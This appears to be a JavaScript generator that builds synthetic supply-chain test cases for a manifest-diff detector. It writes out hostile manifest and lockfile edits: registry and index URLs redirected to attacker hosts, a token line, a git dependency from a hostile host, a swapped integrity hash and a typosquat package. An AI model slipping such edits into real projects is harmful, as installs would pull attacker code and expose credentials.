// supply-chain-dependency: manifest and lockfile changes that fetch attacker code at the next
// install. Each scenario is a real before/after manifest pair whose delta is a redirected source, a
// repointed integrity hash, or an added dependency.
import { finish, modify } from "./_common.mjs";
import { product } from "../lib/rng.mjs";
import { HOSTILE_HOSTS } from "../lib/variants.mjs";

const FAMILY = "supply-chain-dependency";

const PKG_BEFORE = '{\n  "name": "app",\n  "version": "1.0.0",\n  "dependencies": {\n    "left-pad": "^1.3.0"\n  }\n}\n';

// Each shape has a before and an after over one manifest file, and a note on which delta it is.
const SHAPES = [
  {
    name: "npmrc-registry-redirect", file: ".npmrc", delta: "index-url-added",
    before: "registry=https://registry.npmjs.org/\n",
    after: (host) => `registry=http://${host}/\n//${host}/:_authToken=stealme\n`,
  },
  {
    name: "requirements-extra-index", file: "requirements.txt", delta: "index-url-added",
    before: "requests==2.31.0\n",
    after: (host) => `--extra-index-url http://${host}/simple\nrequests==2.31.0\ninternal-utils==0.0.1\n`,
  },
  {
    name: "package-git-dependency", file: "package.json", delta: "dep-added-git",
    before: PKG_BEFORE,
    after: (host) => PKG_BEFORE.replace('"left-pad": "^1.3.0"', `"left-pad": "^1.3.0",\n    "logger": "git+https://${host}/logger.git"`),
  },
  {
    name: "lockfile-resolved-redirect", file: "package-lock.json", delta: "resolved-host-changed",
    before: '{\n  "packages": {\n    "node_modules/left-pad": {\n      "resolved": "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz",\n      "integrity": "sha512-original"\n    }\n  }\n}\n',
    after: (host) => `{\n  "packages": {\n    "node_modules/left-pad": {\n      "resolved": "https://${host}/left-pad-1.3.0.tgz",\n      "integrity": "sha512-original"\n    }\n  }\n}\n`,
  },
  {
    name: "lockfile-integrity-only", file: "package-lock.json", delta: "integrity-changed-without-version-change",
    before: '{\n  "packages": {\n    "node_modules/left-pad": {\n      "version": "1.3.0",\n      "resolved": "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz",\n      "integrity": "sha512-originalHashValueHere=="\n    }\n  }\n}\n',
    after: () => '{\n  "packages": {\n    "node_modules/left-pad": {\n      "version": "1.3.0",\n      "resolved": "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz",\n      "integrity": "sha512-swappedHashValueXX=="\n    }\n  }\n}\n',
  },
  {
    name: "typosquat-added", file: "package.json", delta: "dep-added-registry",
    before: PKG_BEFORE,
    after: () => PKG_BEFORE.replace('"left-pad": "^1.3.0"', '"left-pad": "^1.3.0",\n    "lodahs": "^1.0.0"'),
  },
];

const SPEC_TOKENS = ["prod", "staging", "internal", "mirror", "cache"];

export function generate(rng, budget) {
  const out = [];
  // cross shape with a host token and a spec token to get many concrete deltas per shape
  const tuples = product([SHAPES, HOSTILE_HOSTS, SPEC_TOKENS], rng, budget * 3);
  for (const [shape, host, tok] of tuples) {
    if (out.length >= budget) break;
    const before = shape.before;
    const after = shape.after(host).replace(/left-pad/g, rng.int(4) === 0 ? `left-pad-${tok}` : "left-pad");
    if (after === before) continue;
    out.push(finish({
      generator: "supply-chain.mjs",
      family: FAMILY,
      description: `${shape.name}: a ${shape.delta} delta on ${shape.file} pointing at ${host}. A structured manifest differ sees the delta; a content regex over the whole file does not.`,
      effect_set: [modify(shape.file, before, after)],
      shell_equivalent: `# edit ${shape.file}: ${shape.delta} -> ${host}`,
      severity: "critical",
      likelihood: "common",
      origin: { shape: shape.name, delta: shape.delta, host, specToken: tok },
    }));
  }
  return out;
}
